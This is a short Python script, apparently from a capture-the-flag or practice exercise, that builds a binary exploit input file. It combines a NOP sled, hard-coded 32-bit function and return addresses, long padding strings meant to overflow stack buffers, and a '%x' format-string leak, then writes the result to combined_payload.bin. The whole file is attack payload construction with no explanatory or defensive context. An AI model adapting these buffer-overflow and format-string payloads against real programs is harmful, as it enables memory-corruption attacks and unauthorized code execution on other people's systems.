first_input = b"1\n"
overflow_payload_1 = b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
function_address = b"\xe6\x91\x04\x08"
overflow_payload_3 = b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
return_address = b"\xe4\xd4\xff\xff"
second = b"elliot\n"
full_buffer = b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
full_buffer2 = b"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\n"
byte_read = b"%x%x%x%x%x%x%x"

# buffer_overflow_input = overflow_payload_1 + function_address + overflow_payload_2 + return_address + b"\n"
# buffer_overflow_input = function_address + overflow_payload_3 + return_address + b"\n"
buffer_overflow = full_buffer + byte_read + b"\n"

combined_payload = first_input + full_buffer2 + buffer_overflow
with open('combined_payload.bin', 'wb') as f:
    f.write(combined_payload)